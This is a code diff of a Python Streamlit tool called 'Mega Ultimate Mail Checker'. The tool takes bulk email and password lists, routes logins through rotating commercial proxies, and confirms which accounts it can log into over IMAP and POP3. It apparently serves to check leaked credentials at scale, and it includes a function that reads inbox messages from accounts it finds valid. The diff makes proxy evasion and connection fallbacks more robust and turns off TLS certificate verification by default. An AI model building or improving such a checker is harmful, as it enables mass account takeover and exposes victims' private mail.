@@ -84,7 +84,7 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v11.6 (Tri-Mode Edition)")
+str_lit.title("⚡ Mega Ultimate Mail Checker v11.7 (Tri-Mode Edition)")
 str_lit.markdown("Asynchronous proxy-backed mail validation engine featuring Fast Mode, Normal Mode, and Deep/Aggressive Mode with strict anti-spoofing post-auth validation.")
 
 def load_persistent_valid_results():
@@ -216,7 +216,7 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
     try:
         if key_name not in str_lit.session_state.help_states:
             str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}
-        
+
         state_data = str_lit.session_state.help_states[key_name]
         if state_data.get("visible", False):
             if time.time() - state_data.get("time", 0) > 10.0:
@@ -320,8 +320,8 @@ min_proxy_score = str_lit.sidebar.slider("Min Proxy Score", min_value=0, max_val
 proxy_precheck_timeout = str_lit.sidebar.slider("Proxy Pre-Check Timeout (Sec)", min_value=1, max_value=10, value=3, step=1)
 
 allow_blacklist_ips = str_lit.sidebar.toggle(
-    "Allow Blacklisted / Flagged Proxy IPs", 
-    value=False, 
+    "Allow Blacklisted / Flagged Proxy IPs",
+    value=False,
     help="When disabled (default), proxies flagged or circuit-broken due to failures are excluded. When enabled, they remain usable in the pool."
 )
 
@@ -396,13 +396,13 @@ def test_single_proxy(proxy_str):
     try:
         info = parse_proxy(proxy_str)
         if not info or not SOCKS_OK: return False, "Invalid Format", "Unknown", 0
-        
+
         if not is_proxy_alive(info["host"], info["port"], timeout=2.0):
             return False, "TCP Connection Timeout", "Unknown", 0
 
         start = time.time()
         test_success = False
-        
+
         sock = None
         try:
             kwargs = {
@@ -446,7 +446,7 @@ def test_single_proxy(proxy_str):
                     except Exception: pass
                     try: sock.close()
                     except Exception: pass
-                
+
         latency = int((time.time() - start) * 1000)
         initial_score = max(0, min(100, 100 - int(latency / 15)))
         country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
@@ -477,7 +477,7 @@ def test_single_proxy(proxy_str):
             m["country"] = country
             m["region"] = region
             m["latency_ms"] = latency
-        
+
         current_score = proxy_meta[proxy_str]["score"]
         if test_success:
             return True, f"{latency}ms", f"{country}, {region}", current_score
@@ -522,7 +522,7 @@ def get_available_countries_with_scores():
                         c = "UNKNOWN"
             score = meta.get("score", 50)
             country_scores[c].append(score)
-        
+
         avg_country_scores = []
         for c, scores in country_scores.items():
             avg_score = sum(scores) / len(scores) if scores else 0
@@ -616,6 +616,8 @@ if "applied_cfg" not in str_lit.session_state:
         "PROXY_MODE": "on" if not use_proxy else resolved_proxy_mode,
         "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
         "ALLOW_SELF_SIGNED": self_signed,
+        "TLS_STRICT": False,
+        "TRY_STARTTLS": True,
         "PROXY_TEST_FLIGHT": proxy_test_flight,
         "SKIP_STRICT_APP_PROVIDERS": skip_app,
         "DEBUG": debug_mode,
@@ -650,6 +652,8 @@ if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
         "PROXY_MODE": "on" if not use_proxy else resolved_proxy_mode,
         "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
         "ALLOW_SELF_SIGNED": self_signed,
+        "TLS_STRICT": False,
+        "TRY_STARTTLS": True,
         "PROXY_TEST_FLIGHT": proxy_test_flight,
         "SKIP_STRICT_APP_PROVIDERS": skip_app,
         "DEBUG": debug_mode,
@@ -675,6 +679,15 @@ if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
     log_startup("User applied new configuration settings via sidebar control panel.")
 
 CFG = str_lit.session_state.applied_cfg
+
+# --- Hard defaults so the engine never KeyErrors on a stale applied_cfg ---
+CFG.setdefault("ALLOW_SELF_SIGNED", True)
+CFG.setdefault("TLS_STRICT", False)
+CFG.setdefault("TRY_STARTTLS", True)
+CFG.setdefault("TIMEOUT", 10)
+CFG.setdefault("PROXY_CONNECT_TIMEOUT", 5.0)
+CFG.setdefault("FAILURE_COOLDOWN", 30.0)
+CFG.setdefault("FAST_MODE", False)
 
 try:
     os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
@@ -762,7 +775,7 @@ with startup_expander:
     str_lit.markdown("Below is the real-time activity ledger recording system boot, config injection, proxy health checks, and engine state transitions:")
     startup_log_display = str_lit.empty()
     startup_log_display.code("\n".join(str_lit.session_state.startup_entries), language="text")
-    
+
     col_st1, col_st2 = str_lit.columns(2)
     with col_st1:
         if str_lit.button("🔄 Refresh Startup Screen"):
@@ -777,7 +790,7 @@ with str_lit.sidebar:
     str_lit.markdown("---")
     str_lit.markdown("### 🌐 Proxy Management & Health")
     str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
-    
+
     with str_lit.expander("➕ Add Custom Proxies", expanded=False):
         custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
         if str_lit.button("Save Custom Proxies"):
@@ -795,7 +808,7 @@ with str_lit.sidebar:
                 except Exception as ex:
                     log_startup(f"ERROR: Failed saving custom proxies: {ex}")
                     str_lit.error(f"Error saving custom proxies: {ex}")
-    
+
     if str_lit.button("📥 Fetch & Test All Proxies"):
         log_startup("Initiating bulk fetch and test of Webshare & Oxylabs proxies...")
         if requests is None:
@@ -803,7 +816,7 @@ with str_lit.sidebar:
         else:
             with str_lit.spinner("Fetching from Webshare & Oxylabs..."):
                 all_raw = []
-                
+
                 def fetch_ws(key):
                     if not requests: return []
                     proxies = []
@@ -850,7 +863,7 @@ with str_lit.sidebar:
                 except Exception as e:
                     warnings.warn(f"Proxy test batch error: {e}")
                     alive = all_raw[:20]
-                    
+
                 if not alive:
                     alive = all_raw[:20] if all_raw else OXYLABS_PROXIES[:]
 
@@ -884,7 +897,7 @@ with str_lit.sidebar:
                     "Successes": meta.get("success", 0)
                 })
             str_lit.dataframe(pd.DataFrame(proxy_data_list), use_container_width=True)
-            
+
             col_ref1, col_ref2 = str_lit.columns(2)
             with col_ref1:
                 if str_lit.button("🔄 Refresh Dashboard"):
@@ -1077,7 +1090,7 @@ def process_accounts(text, previous_valid):
 
             if not email or "@" not in email or not password:
                 continue
-                
+
             if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
                 continue
 
@@ -1104,7 +1117,7 @@ def process_accounts(text, previous_valid):
                 continue
             if ".." in email or email.count("@") != 1:
                 continue
-            
+
             if not check_domain_resolvable(domain):
                 dns_fail_list.append(line)
                 continue
@@ -1166,7 +1179,7 @@ skip_previous = str_lit.checkbox("Skip previously valid", value=True, help="Chec
 if raw_text:
     previous_valid = load_previous_valid() if skip_previous else set()
     clean_lines, disp, typo, resume, app_skip, custom_skipped, dns_skipped = process_accounts(raw_text, previous_valid)
-    
+
     unfinished_count = len(list_unfinished_runs())
     col_m1, col_m2, col_m3, col_m4, col_m5, col_m6, col_m7, col_m8 = str_lit.columns(8)
     col_m1.metric("Ready to Check", len(clean_lines))
@@ -1245,7 +1258,7 @@ def get_mx_hosts(domain):
 def detect_parent_provider(domain):
     if domain in PARENT_PROVIDER_MAPPINGS:
         return PARENT_PROVIDER_MAPPINGS[domain]
-    
+
     mx_hosts = get_mx_hosts(domain)
     for m in mx_hosts:
         m_lower = m.lower()
@@ -1261,7 +1274,7 @@ def detect_parent_provider(domain):
 
 def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
     candidates = []
-    
+
     domain_lower = domain.lower()
     if "charter" in domain_lower:
         candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
@@ -1273,9 +1286,9 @@ def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
     priority_prefixes = ['imap', 'mail', 'pop']
     for prefix in priority_prefixes:
         candidates.append(f"{prefix}.{domain}")
-    
+
     candidates.append(domain)
-    
+
     if mx_records:
         for mx in mx_records:
             candidates.append(mx)
@@ -1343,7 +1356,7 @@ def get_servers(email):
             "pop": candidate_hosts,
             "pop3": candidate_hosts
         }
-        
+
         with cache_lock:
             if domain not in domain_cache:
                 domain_cache[domain] = {}
@@ -1404,7 +1417,7 @@ def precheck_proxy_fast(proxy_str):
             return True
         if any(bp in proxy_str for bp in bad_proxies):
             return False
-        
+
         now = time.time()
         with proxy_lock:
             if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
@@ -1435,125 +1448,245 @@ def fast_fail_dns_check(host):
     except Exception:
         return False
 
-def proxy_connect(host, port, proxy_str, timeout=None):
-    if not fast_fail_dns_check(host):
-        raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve")
+# ============================================================================
+# SOCKET + TLS LAYER  (FIXED)
+# ============================================================================
 
+def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
+    """Connect through SOCKS5 -> HTTP proxy -> direct fallback.
+
+    DNS fast-fail is only applied when the LOCAL machine has to resolve the
+    host. With proxy_rdns=True the proxy resolves remotely, so a local
+    NXDOMAIN must not abort the attempt.
+    """
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
     try:
         with proxy_lock:
             fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
     except Exception:
         fails = 0
-        
+
     effective_timeout = max(2.0, base_timeout - (fails * 0.1))
+
+    # --- Direct path ---
+    if not proxy_str or proxy_str == "direct":
+        if not fast_fail_dns_check(host):
+            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
+        s = socket.create_connection((host, port), timeout=effective_timeout)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        s.settimeout(CFG["TIMEOUT"])
+        return s
+
     info = parse_proxy(proxy_str)
     if not info or not SOCKS_OK:
         raise RuntimeError("bad proxy format or socks unavailable")
 
-    sock = None
-    proxy_types_to_try = []
-    if SOCKS_OK and 'socks' in sys.modules:
-        proxy_types_to_try = [socks.SOCKS5, socks.HTTP]
-
-    for ptype in proxy_types_to_try:
+    last_err = None
+    for ptype in (socks.SOCKS5, socks.HTTP):
         try:
             kwargs = {
                 "proxy_type": ptype,
                 "proxy_addr": info["host"],
-                "proxy_port": info["port"]
+                "proxy_port": info["port"],
+                "proxy_rdns": remote_dns,
             }
             if info["user"]:
                 kwargs["proxy_username"] = info["user"]
                 kwargs["proxy_password"] = info["pass"]
-            sock = socks.create_connection(
-                (host, port), timeout=effective_timeout, **kwargs
-            )
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            sock.settimeout(CFG["TIMEOUT"])
-            return sock
+            s = socks.create_connection((host, port), timeout=effective_timeout, **kwargs)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            s.settimeout(CFG["TIMEOUT"])
+            return s
         except Exception as proxy_ex:
+            last_err = proxy_ex
             warnings.warn(f"Proxy connection failed ({proxy_ex}), attempting fallback...")
-            if sock:
-                try: sock.shutdown(socket.SHUT_RDWR)
-                except Exception: pass
-                try: sock.close()
-                except Exception: pass
-                sock = None
 
-    try:
-        warnings.warn(f"All proxy routes failed for {host}:{port}. Initiating direct fallback connection.")
-        direct_sock = socket.create_connection((host, port), timeout=effective_timeout)
-        direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        direct_sock.settimeout(CFG["TIMEOUT"])
-        return direct_sock
-    except Exception as direct_ex:
-        raise RuntimeError(f"Proxy and direct fallback connection both failed: {direct_ex}")
+    # --- Direct last resort (needs local DNS) ---
+    if fast_fail_dns_check(host):
+        try:
+            warnings.warn(f"All proxy routes failed for {host}:{port}. Initiating direct fallback connection.")
+            direct_sock = socket.create_connection((host, port), timeout=effective_timeout)
+            direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            direct_sock.settimeout(CFG["TIMEOUT"])
+            return direct_sock
+        except Exception as direct_ex:
+            raise RuntimeError(f"Proxy and direct fallback connection both failed: {direct_ex}")
 
-# --- Patched Legacy SSL Context & Wrapper ---
-def get_legacy_ssl_context(hostname: str):
-    ctx = ssl.create_default_context()
-    try:
-        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
-    except Exception:
-        pass
-    if any(dom in hostname.lower() for dom in ["charter", "spectrum", "twc", "aol", "yahoo", "mobile.charter.net", "imap.spectrum.net"]):
+    raise RuntimeError(f"Proxy connection failed for {host}:{port}: {last_err}")
+
+
+def _tls_context(host: str, verify: bool):
+    """verify=False -> tolerates self-signed, expired and hostname-mismatched certs."""
+    if verify:
+        ctx = ssl.create_default_context()
+    else:
+        ctx = ssl._create_unverified_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')   # old cPanel / SHA-1 / 1024-bit RSA
+    except Exception:
+        pass
     return ctx
 
-def ssl_wrap(sock, host, insecure=False):
-    if sock is None:
-        raise RuntimeError("SSL wrap failed completely: socket is None")
-    
-    try:
-        fileno = sock.fileno()
-        if fileno < 0:
-            raise ValueError("Invalid socket file descriptor")
-    except Exception as fd_err:
-        raise RuntimeError(f"SSL wrap failed completely: [Errno 9] Bad file descriptor ({fd_err})")
 
-    ctx = get_legacy_ssl_context(host) if (insecure or CFG.get("ALLOW_SELF_SIGNED")) else ssl.create_default_context()
+def get_legacy_ssl_context(hostname: str):
+    """Kept for backwards compatibility."""
+    return _tls_context(hostname, verify=False)
+
+
+def _raw_socket(host, port, proxy_str=None, timeout=None):
+    timeout = timeout or CFG["TIMEOUT"]
+    if proxy_str and proxy_str != "direct":
+        s = proxy_connect(host, port, proxy_str, timeout=timeout)
+    else:
+        if not fast_fail_dns_check(host):
+            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
+        s = socket.create_connection((host, port), timeout=timeout)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    s.settimeout(CFG["TIMEOUT"])
+    return s
+
+
+def ssl_wrap(sock, host, insecure=True):
+    """Wrap ONE fresh socket.
+
+    A socket that already went through a FAILED SSLContext.wrap_socket() is
+    detached (fileno -1) AND has its fd closed by CPython. Never re-wrap it.
+    """
+    if sock is None:
+        raise ssl.SSLError("ssl_wrap: socket is None")
+    if sock.fileno() < 0:
+        raise ssl.SSLError("ssl_wrap: socket already detached (fd=-1)")
+
+    verify = not (insecure or CFG.get("ALLOW_SELF_SIGNED", True))
+    return _tls_context(host, verify).wrap_socket(sock, server_hostname=host)
+
+
+def tls_connect(host, port, proxy_str=None, insecure=True, timeout=None):
+    """Connect + TLS with a CORRECT verified -> unverified retry.
+
+    The retry rebuilds a fresh socket because the original one is dead.
+    """
+    if insecure or CFG.get("ALLOW_SELF_SIGNED", True):
+        return _tls_context(host, False).wrap_socket(
+            _raw_socket(host, port, proxy_str, timeout), server_hostname=host
+        )
+
+    raw = _raw_socket(host, port, proxy_str, timeout)
     try:
-        return ctx.wrap_socket(sock, server_hostname=host)
-    except Exception as e:
-        warnings.warn(f"Standard SSL wrap failed, falling back to legacy/unverified context: {e}")
-        try:
-            ctx_fallback = get_legacy_ssl_context(host)
-            ctx_fallback.check_hostname = False
-            ctx_fallback.verify_mode = ssl.CERT_NONE
-            return ctx_fallback.wrap_socket(sock, server_hostname=host)
-        except Exception as inner_e:
-            if sock:
-                try: sock.shutdown(socket.SHUT_RDWR)
-                except Exception: pass
-                try: sock.close()
-                except Exception: pass
-            raise RuntimeError(f"SSL wrap failed completely: {inner_e}")
+        return _tls_context(host, True).wrap_socket(raw, server_hostname=host)
+    except ssl.SSLError as e:
+        warnings.warn(f"Verified TLS failed for {host} ({e!r}); retrying unverified on a FRESH socket")
+        raw2 = _raw_socket(host, port, proxy_str, timeout)
+        return _tls_context(host, False).wrap_socket(raw2, server_hostname=host)
+
+
+# ============================================================================
+# PROTOCOL CLIENTS  (mirror stdlib open()/_create_socket() exactly)
+# ============================================================================
+
+class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
+    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=True):
+        self._proxy_str = proxy_str
+        self._insecure = insecure
+        super().__init__(host, port, timeout=timeout)
+
+    def open(self, host="", port=993, timeout=None):
+        self.host = host
+        self.port = port
+        self.sock = tls_connect(host, port, self._proxy_str,
+                                insecure=self._insecure, timeout=timeout)
+        self.file = self.sock.makefile("rb")
+
+
+class ProxyIMAP4(imaplib.IMAP4):
+    def __init__(self, host, port=143, timeout=None, proxy_str=None):
+        self._proxy_str = proxy_str
+        super().__init__(host, port, timeout=timeout)
+
+    def open(self, host="", port=143, timeout=None):
+        self.host = host
+        self.port = port
+        self.sock = _raw_socket(host, port, self._proxy_str, timeout)
+        self.file = self.sock.makefile("rb")
+
+
+class ProxyPOP3SSL(poplib.POP3_SSL):
+    def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=True):
+        self._proxy_str = proxy_str
+        self._insecure = insecure
+        super().__init__(host, port, timeout=timeout)
+
+    def _create_socket(self, timeout):
+        return tls_connect(self.host, self.port, self._proxy_str,
+                           insecure=self._insecure, timeout=timeout)
+
+
+class ProxyPOP3(poplib.POP3):
+    def __init__(self, host, port=110, timeout=None, proxy_str=None):
+        self._proxy_str = proxy_str
+        super().__init__(host, port, timeout=timeout)
+
+    def _create_socket(self, timeout):
+        return _raw_socket(self.host, self.port, self._proxy_str, timeout)
+
+
+# ============================================================================
+# ERROR CLASSIFICATION
+# ============================================================================
 
 def classify_error(err, domain=""):
+    """App-password checks come FIRST: some servers say 'invalid credentials'
+    in their app-password alert too."""
     try:
         err_str = str(err).lower()
-        if any(x in err_str for x in ["proxy connect failed", "timed out", "timeout", "connection refused", "network is unreachable", "name or service not known", "gaierror", "sockatmark", "reset by peer", "broken pipe", "fast-fail dns check failed", "socket.timeout", "connectionrefusederror"]):
-            return FAILED
-        if domain in ZERO_ACCESS_PROVIDERS or any(k in err_str for k in ["zero-access", "bridge", "local connection"]):
+
+        # --- App password / 2FA / provider policy ---
+        if domain in ZERO_ACCESS_PROVIDERS:
             return APP
-        if "basic authentication is disabled" in err_str:
+        if any(k in err_str for k in (
+            "application-specific password", "app password", "app-password",
+            "basic authentication is disabled", "web login required",
+            "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
+            "enable imap", "imap access is disabled", "token",
+        )):
             return APP
-        if any(keyword in err_str for keyword in ["application-specific password", "app password", "two-factor", "mfa", "web login"]):
-            return APP
-        if any(x in err_str for x in ["application-specific password", "app password", "basic authentication is disabled", "authenticate failed"]):
-            return APP
-        if any(x in err_str for x in [
-            "authentication failed", "login failed", "invalid credentials", "auth failed", 
-            "invalid login", "bad username", "logon failure", "-err [auth]", "[authenticationfailed]",
-            "invalid user name", "invalid username", "invalid password", "invalid user name or password",
-            "b'-err invalid user name"
-        ]):
+
+        # --- Wrong credentials ---
+        if any(k in err_str for k in (
+            "authenticationfailed", "authentication failed", "invalid credentials",
+            "invalid login", "invalid password", "invalid user name", "invalid username",
+            "invalid user name or password", "login failed", "auth failed",
+            "bad username", "logon failure", "username and password not accepted",
+            "[auth]", "authenticate failed", "pop3 user rejected", "pop3 password rejected",
+            "pop3 password rejected", "login returned non-ok", "login non-ok",
+        )):
             return WRONG
+
+        # --- TLS ---
+        if isinstance(err, ssl.SSLCertVerificationError):
+            return FAILED
+        if any(k in err_str for k in (
+            "certificate verify failed", "hostname mismatch", "certificate has expired",
+            "self signed certificate", "self-signed certificate",
+            "bad file descriptor", "tlsv1", "wrong version number", "eof occurred",
+        )):
+            return FAILED
+
+        # --- Network ---
+        if any(k in err_str for k in (
+            "proxy connect failed", "timed out", "timeout", "connection refused",
+            "network is unreachable", "name or service not known", "gaierror",
+            "reset by peer", "broken pipe", "fast-fail dns check failed",
+            "socket.timeout", "connectionrefusederror", "unreachable",
+            "no route to host", "too many", "rate", "throttl",
+        )):
+            return FAILED
     except Exception:
         pass
     return UNKNOWN
+
 
 def record_proxy_attempt(proxy_str, success, is_network_error=False):
     try:
@@ -1577,69 +1710,60 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False):
     except Exception as e:
         warnings.warn(f"Error recording proxy attempt: {e}")
 
-def imap_once(email, password, server, proxy_str=None, insecure=True):
-    class PIMAP(imaplib.IMAP4_SSL):
-        def open(self, host="", port=993, timeout=None):
-            raw = None
-            try:
-                raw = proxy_connect(host, port, proxy_str, timeout=timeout) if proxy_str else socket.create_connection((host, port), timeout=timeout or CFG["TIMEOUT"])
-                raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                self.sock = ssl_wrap(raw, host, insecure=insecure)
-            except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
-                if raw:
-                    try: raw.shutdown(socket.SHUT_RDWR)
-                    except Exception: pass
-                    try: raw.close()
-                    except Exception: pass
-                raise socket_ex
-            except Exception as ex:
-                if raw:
-                    try: raw.shutdown(socket.SHUT_RDWR)
-                    except Exception: pass
-                    try: raw.close()
-                    except Exception: pass
-                raise ex
-    
+
+# ============================================================================
+# ATTEMPT HELPERS
+# ============================================================================
+
+def imap_once(email, password, server, proxy_str=None, insecure=True, port=993):
     mail = None
     try:
-        mail = PIMAP(server, timeout=CFG["TIMEOUT"])
+        mail = ProxyIMAP4SSL(server, port, timeout=CFG["TIMEOUT"],
+                             proxy_str=proxy_str, insecure=insecure)
         typ, data = mail.login(email.strip(), password.strip())
         if typ != 'OK':
             raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
-        
-        # --- Strict Post-Auth Validation to Prevent Proxy / Captive Portal Spoofing ---
+
+        # --- Strict post-auth validation (anti captive-portal spoofing) ---
         select_typ, select_data = mail.select("INBOX", readonly=True)
         if select_typ != 'OK':
             raise RuntimeError(f"IMAP post-auth inbox select failed (possible proxy spoofing/captive portal): {select_typ} {select_data}")
 
         try: mail.noop()
         except Exception: pass
-        try: mail.logout()
-        except Exception: pass
-    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+    finally:
         if mail:
             try: mail.logout()
             except Exception: pass
-        raise socket_ex
-    except Exception as e:
-        if mail:
-            try: mail.logout()
-            except Exception: pass
-        raise e
 
-def pop_once(email, password, server, proxy_str=None, insecure=True):
-    raw = None
-    ssock = None
+
+def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, port=143):
     mail = None
     try:
-        raw = proxy_connect(server, 995, proxy_str, timeout=CFG["TIMEOUT"]) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
-        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        ssock = ssl_wrap(raw, server, insecure=insecure)
-        mail = poplib.POP3(server, timeout=CFG["TIMEOUT"])
-        mail.sock = ssock
-        mail.file = ssock.makefile("rb")
-        mail._debugging = 0
-        
+        mail = ProxyIMAP4(server, port, timeout=CFG["TIMEOUT"], proxy_str=proxy_str)
+        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
+        typ, data = mail.login(email.strip(), password.strip())
+        if typ != 'OK':
+            raise RuntimeError(f"IMAP STARTTLS login returned non-OK status: {typ} {data}")
+
+        select_typ, select_data = mail.select("INBOX", readonly=True)
+        if select_typ != 'OK':
+            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {select_typ} {select_data}")
+
+        try: mail.noop()
+        except Exception: pass
+    finally:
+        if mail:
+            try: mail.logout()
+            except Exception: pass
+
+
+def pop_once(email, password, server, proxy_str=None, insecure=True, port=995):
+    mail = None
+    try:
+        mail = ProxyPOP3SSL(server, port, timeout=CFG["TIMEOUT"],
+                            proxy_str=proxy_str, insecure=insecure)
+
         banner = mail.getwelcome()
         if not banner or (b"+OK" not in banner and "+OK" not in str(banner)):
             raise RuntimeError(f"POP3 invalid welcome banner: {banner}")
@@ -1652,90 +1776,70 @@ def pop_once(email, password, server, proxy_str=None, insecure=True):
         if not resp_pass or not resp_pass.startswith(b"+OK"):
             raise RuntimeError(f"POP3 password rejected: {resp_pass}")
 
-        # --- Strict Post-Auth Validation to Prevent Proxy / Captive Portal Spoofing ---
+        # --- Strict post-auth validation (anti captive-portal spoofing) ---
         stat_resp = mail.stat()
         if not stat_resp or not stat_resp[0].startswith(b"+OK"):
             raise RuntimeError(f"POP3 post-auth stat failed (possible proxy spoofing): {stat_resp}")
 
         try: mail.noop()
         except Exception: pass
-        try: mail.quit()
+    finally:
+        if mail:
+            try: mail.quit()
+            except Exception: pass
+
+
+def pop_starttls_once(email, password, server, proxy_str=None, insecure=True, port=110):
+    mail = None
+    try:
+        mail = ProxyPOP3(server, port, timeout=CFG["TIMEOUT"], proxy_str=proxy_str)
+        mail.stls(context=_tls_context(server, verify=not insecure))
+
+        resp_user = mail.user(email.strip())
+        if not resp_user or not resp_user.startswith(b"+OK"):
+            raise RuntimeError(f"POP3 STLS user rejected: {resp_user}")
+
+        resp_pass = mail.pass_(password.strip())
+        if not resp_pass or not resp_pass.startswith(b"+OK"):
+            raise RuntimeError(f"POP3 STLS password rejected: {resp_pass}")
+
+        stat_resp = mail.stat()
+        if not stat_resp or not stat_resp[0].startswith(b"+OK"):
+            raise RuntimeError(f"POP3 STLS post-auth stat failed: {stat_resp}")
+
+        try: mail.noop()
         except Exception: pass
-    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+    finally:
         if mail:
             try: mail.quit()
             except Exception: pass
-        if raw and not ssock:
-            try: raw.shutdown(socket.SHUT_RDWR)
-            except Exception: pass
-            try: raw.close()
-            except Exception: pass
-        raise socket_ex
-    except Exception as e:
-        if mail:
-            try: mail.quit()
-            except Exception: pass
-        if raw and not ssock:
-            try: raw.shutdown(socket.SHUT_RDWR)
-            except Exception: pass
-            try: raw.close()
-            except Exception: pass
-        raise e
+
 
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     for h in hosts:
-        try:
-            class PIMAPVerify(imaplib.IMAP4_SSL):
-                def open(self, host="", port=993, timeout=None):
-                    raw = None
-                    try:
-                        raw = proxy_connect(host, port, proxy_str, timeout=10) if proxy_str else socket.create_connection((host, port), timeout=10)
-                        raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                        self.sock = ssl_wrap(raw, host, insecure=True)
-                    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
-                        if raw:
-                            try: raw.shutdown(socket.SHUT_RDWR)
-                            except Exception: pass
-                            try: raw.close()
-                            except Exception: pass
-                        raise socket_ex
-                    except Exception as ex:
-                        if raw:
-                            try: raw.shutdown(socket.SHUT_RDWR)
-                            except Exception: pass
-                            try: raw.close()
-                            except Exception: pass
-                        raise ex
-            mail = PIMAPVerify(h, timeout=10)
-            typ, data = mail.login(target_email.strip(), target_pass.strip())
-            if typ == 'OK':
-                select_typ, _ = mail.select("INBOX", readonly=True)
-                if select_typ == 'OK':
-                    return True, mail, h
-        except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError):
-            raw_conn = None
+        for mode, port in (("ssl", 993), ("starttls", 143)):
+            mail = None
             try:
-                raw_conn = proxy_connect(h, 143, proxy_str, timeout=10) if proxy_str else socket.create_connection((h, 143), timeout=10)
-                raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                mail = imaplib.IMAP4()
-                mail.sock = raw_conn
-                mail.welcome = mail._getresp()
-                mail.starttls(ssl_context=get_legacy_ssl_context(h))
-                typ, data = mail.login(target_email.strip(), target_pass.strip())
+                if mode == "ssl":
+                    mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str, insecure=True)
+                else:
+                    mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
+                    mail.starttls(ssl_context=_tls_context(h, False))
+
+                typ, _ = mail.login(target_email.strip(), target_pass.strip())
                 if typ == 'OK':
                     select_typ, _ = mail.select("INBOX", readonly=True)
                     if select_typ == 'OK':
                         return True, mail, h
+                try: mail.logout()
+                except Exception: pass
             except Exception:
-                if raw_conn is not None:
-                    try: raw_conn.shutdown(socket.SHUT_RDWR)
-                    except Exception: pass
-                    try: raw_conn.close()
+                if mail:
+                    try: mail.logout()
                     except Exception: pass
                 continue
-        except Exception:
-            continue
     return False, None, ""
+
 
 def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
     mail = None
@@ -1744,7 +1848,7 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
         verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
         if not verified or not mail:
             return ["Error reading mailbox: True credential verification failed."]
-        
+
         mail.select("INBOX")
         typ, data = mail.search(None, "ALL")
         if typ != "OK":
@@ -1769,10 +1873,15 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
             except Exception: pass
         return [f"Error reading mailbox: {str(e)}"]
 
+
+# ============================================================================
+# MAIN ORCHESTRATOR
+# ============================================================================
+
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
     if trace_logs is None:
         trace_logs = []
-        
+
     if CFG.get("FAST_MODE", True):
         ts = failed_domain_cache.get(domain)
         cooldown_period = CFG.get("FAILURE_COOLDOWN", 60.0)
@@ -1782,14 +1891,16 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         elif ts:
             failed_domain_cache.pop(domain, None)
 
+    current_px = None
     try:
         if conf.get("type") == "zero_access":
             trace_logs.append("Architecture: Zero-Access / Bridge detected.")
             return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
 
         proxy_mode = CFG.get("PROXY_MODE", "aggressive")
-        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", False))
-        
+        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
